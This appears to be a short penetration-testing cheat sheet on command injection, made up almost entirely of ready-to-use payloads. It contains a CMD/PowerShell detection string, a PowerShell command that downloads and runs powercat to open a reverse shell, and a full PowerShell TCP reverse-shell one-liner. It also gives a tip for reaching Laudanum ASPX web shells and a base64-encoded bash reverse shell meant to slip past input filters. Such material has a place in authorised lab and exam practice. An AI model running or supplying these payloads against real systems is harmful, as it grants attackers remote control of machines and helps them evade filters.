# Command Injection

**Detect shell type (CMD vs PowerShell):**
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

**PowerShell reverse shell via powercat:**
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.49.51:9000/powercat.ps1");powercat -c 192.168.49.51 -p 4444 -e powershell
```

**PowerShell TCP reverse shell one-liner:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.53',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> Laudanum ASPX shells (`/usr/share/webshells/laudanum/aspx/shell.aspx`) require `X-Forwarded-For: 127.0.0.1` header.

**Linux base64 bypass for filters:**
```
echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDkuNTEvOTAwMSAwPiYx|base64+-d|bash
```
